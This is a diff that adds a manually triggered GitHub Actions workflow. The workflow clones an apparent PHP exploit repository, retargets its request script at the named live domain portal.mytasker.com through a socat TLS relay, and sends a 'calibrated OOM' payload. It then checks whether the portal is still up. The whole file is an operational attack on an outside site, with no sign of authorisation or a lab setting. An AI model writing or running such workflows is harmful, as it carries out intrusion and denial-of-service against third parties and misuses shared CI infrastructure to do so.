@@ -1,0 +1,26 @@
+name: probea
+on: workflow_dispatch
+jobs:
+  a:
+    runs-on: ubuntu-latest
+    timeout-minutes: 8
+    steps:
+      - name: setup
+        run: |
+          sudo sh -c 'echo "69.49.247.128 portal.mytasker.com" >> /etc/hosts'
+          sudo apt-get -qq update && sudo apt-get -qq install -y socat >/dev/null
+          sudo nohup socat TCP-LISTEN:8088,fork,reuseaddr OPENSSL:portal.mytasker.com:443 >/tmp/socat.log 2>&1 &
+          sleep 2
+          git clone -q https://github.com/9bie/php2shell-bypass-aslr-exp /tmp/p
+          sed -i 's/Host: 127.0.0.1:8088/Host: portal.mytasker.com/' /tmp/p/tools/send_a_oom5.py
+          grep -n "Host:" /tmp/p/tools/send_a_oom5.py
+      - name: control then OOM
+        run: |
+          cd /tmp/p/tools
+          echo "== control (small body, should be 200 + cookie) =="
+          timeout 90 python3 send_a_oom5.py 0 62 20 1000 208 0 4000 103 2>&1 | grep -aE "RESP_LEN|SETCOOKIE" | cut -c1-100
+          echo "== calibrated OOM body =="
+          timeout 120 python3 send_a_oom5.py 0 62 235 15500 208 0 4000 103 2>&1 | grep -aE "RESP_LEN|SETCOOKIE|recv_err" | cut -c1-140
+          echo "== after: is the portal still 200? =="
+          sleep 2
+          curl -s -o /dev/null -w "%{http_code}\n" --max-time 15 https://portal.mytasker.com/index.php
